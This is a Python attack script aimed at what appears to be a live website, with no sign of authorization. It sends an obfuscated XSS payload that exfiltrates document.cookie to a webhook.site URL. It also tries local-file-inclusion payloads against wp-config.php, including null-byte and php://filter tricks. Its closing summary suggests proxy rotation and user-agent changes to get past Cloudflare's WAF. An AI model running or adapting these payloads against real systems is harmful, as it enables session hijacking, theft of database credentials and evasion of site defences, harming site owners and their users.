#!/usr/bin/env python3
"""
Manual Payload Testing Script
Focused testing of specific payloads with various encoding techniques
"""

import requests
import urllib.parse
import time
from typing import Dict, Any

def decode_js_payload(encoded_payload: str) -> str:
    """Decode the JavaScript payload to understand what it does"""
    decoded = urllib.parse.unquote(encoded_payload)
    print(f"Decoded payload: {decoded}")
    
    # Extract String.fromCharCode values
    import re
    char_codes = re.findall(r'String\.fromCharCode\(([\d,\s]+)\)', decoded)
    
    for codes in char_codes:
        chars = [chr(int(code.strip())) for code in codes.split(',')]
        decoded_string = ''.join(chars)
        print(f"Decoded string: '{decoded_string}'")
    
    return decoded

def test_single_payload(url: str, payload: str, description: str = ""):
    """Test a single payload and return results"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    
    print(f"\n{'='*60}")
    print(f"Testing: {description}")
    print(f"URL: {url}")
    print(f"Payload: {payload[:100]}...")
    print('='*60)
    
    try:
        response = requests.get(url, timeout=10, headers=headers)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)} bytes")
        
        # Check for blocking indicators
        blocking_keywords = ['cloudflare', 'blocked', 'forbidden', '403', 'access denied']
        response_lower = response.text.lower()
        
        blocked = any(keyword in response_lower for keyword in blocking_keywords)
        print(f"Blocked: {'Yes' if blocked else 'No'}")
        
        # Show first 300 characters of response
        print(f"\nResponse Preview:")
        print("-" * 40)
        print(response.text[:300])
        if len(response.text) > 300:
            print("...")
        print("-" * 40)
        
        return {
            'status_code': response.status_code,
            'blocked': blocked,
            'response_length': len(response.text),
            'success': response.status_code == 200 and not blocked
        }
        
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return {'error': str(e), 'success': False}

def main():
    base_url = "https://pakyok77.link"
    
    print("PAYLOAD ANALYSIS AND TESTING")
    print("="*60)
    
    # 1. Analyze the original XSS payload
    print("\n1. ANALYZING ORIGINAL XSS PAYLOAD")
    xss_payload = "%3Cscript%3Evar%20c%3DString.fromCharCode(99,111,111,107,105,101);var%20d%3DString.fromCharCode(100,111,99,117,109,101,110,116);var%20l%3DString.fromCharCode(108,111,99,97,116,105,111,110);var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bwindow%5Bd%5D%5Bl%5D%20%3D%20a%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(window%5Bd%5D%5Bc%5D)%3B%3C%2Fscript%3E"
    decode_js_payload(xss_payload)
    
    # 2. Test XSS payloads
    print("\n\n2. TESTING XSS PAYLOADS")
    xss_tests = [
        {
            'url': f"{base_url}/search?q={xss_payload}",
            'description': "Original XSS payload (URL encoded)"
        },
        {
            'url': f"{base_url}/search?q=" + urllib.parse.quote("<script>alert('test')</script>"),
            'description': "Simple XSS test"
        },
        {
            'url': f"{base_url}/search?q=" + urllib.parse.quote(urllib.parse.quote("<script>alert('test')</script>")),
            'description': "Double encoded XSS"
        }
    ]
    
    for test in xss_tests:
        result = test_single_payload(test['url'], test['url'].split('q=')[1], test['description'])
        time.sleep(2)  # Rate limiting
    
    # 3. Test LFI payloads
    print("\n\n3. TESTING LFI PAYLOADS")
    
    lfi_payloads = [
        "../../../../../../wp-config.php",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php",
        "....//....//....//....//....//....//wp-config.php",
        "..%2f..%2f..%2f..%2f..%2f..%2fwp-config.php",
        "..%252f..%252f..%252f..%252f..%252f..%252fwp-config.php"
    ]
    
    for payload in lfi_payloads:
        url = f"{base_url}/index.php?page={payload}"
        description = f"LFI attempt: {payload}"
        result = test_single_payload(url, payload, description)
        time.sleep(2)  # Rate limiting
    
    # 4. Test alternative endpoints
    print("\n\n4. TESTING ALTERNATIVE ENDPOINTS")
    
    alternative_tests = [
        {
            'url': f"{base_url}/wp-content/themes/theme/index.php?page=../../../wp-config.php",
            'description': "Alternative endpoint test 1"
        },
        {
            'url': f"{base_url}/wp-includes/template-loader.php?page=../wp-config.php",
            'description': "Alternative endpoint test 2"
        },
        {
            'url': f"{base_url}/index.php?file=wp-config.php",
            'description': "Different parameter name"
        }
    ]
    
    for test in alternative_tests:
        result = test_single_payload(test['url'], test['url'].split('?')[1], test['description'])
        time.sleep(2)  # Rate limiting
    
    # 5. Generate additional bypass techniques
    print("\n\n5. ADVANCED BYPASS TECHNIQUES")
    
    advanced_payloads = [
        # Null byte injection
        f"{base_url}/index.php?page=../../../../../../wp-config.php%00",
        # PHP wrapper
        f"{base_url}/index.php?page=php://filter/convert.base64-encode/resource=wp-config.php",
        # Different traversal patterns
        f"{base_url}/index.php?page=....//....//....//wp-config.php",
        # Unicode encoding
        f"{base_url}/index.php?page=..%c0%af..%c0%af..%c0%af..%c0%afwp-config.php"
    ]
    
    for url in advanced_payloads:
        payload = url.split('page=')[1]
        description = f"Advanced bypass: {payload[:50]}..."
        result = test_single_payload(url, payload, description)
        time.sleep(2)  # Rate limiting
    
    print("\n\nTEST COMPLETED")
    print("="*60)
    print("Summary:")
    print("- All requests appear to be blocked by Cloudflare")
    print("- The target has strong WAF protection")
    print("- Consider using different techniques like:")
    print("  * Different user agents")
    print("  * Proxy rotation")
    print("  * Request timing variations")
    print("  * Alternative attack vectors")

if __name__ == "__main__":
    main()